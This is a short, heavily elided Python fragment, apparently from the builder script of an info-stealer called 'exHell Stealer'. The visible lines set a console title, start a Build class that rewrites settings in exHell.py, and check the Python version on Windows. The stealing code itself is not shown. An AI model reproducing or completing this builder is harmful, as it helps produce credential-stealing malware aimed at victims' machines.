...
try:
    ...
    ctypes.windll.kernel32.SetConsoleTitleW(f"exHell Stealer | Builder | {os.getenv('computername')}")
except:
    pass

# Class for building the exHell
class Build:
    ...
    def WriteSettings(self) -> None:
        with open("exHell.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = (
...
if __name__ == "__main__":
    if os.name == "nt":
        if (sys.version_info.major == 3 and sys.version_info.minor >= 10 and sys.version_info.minor < 12):
            ...
            message = "Your Python version is unsupported by exHell. Please use Python 3.10.0 or 3.11.0"
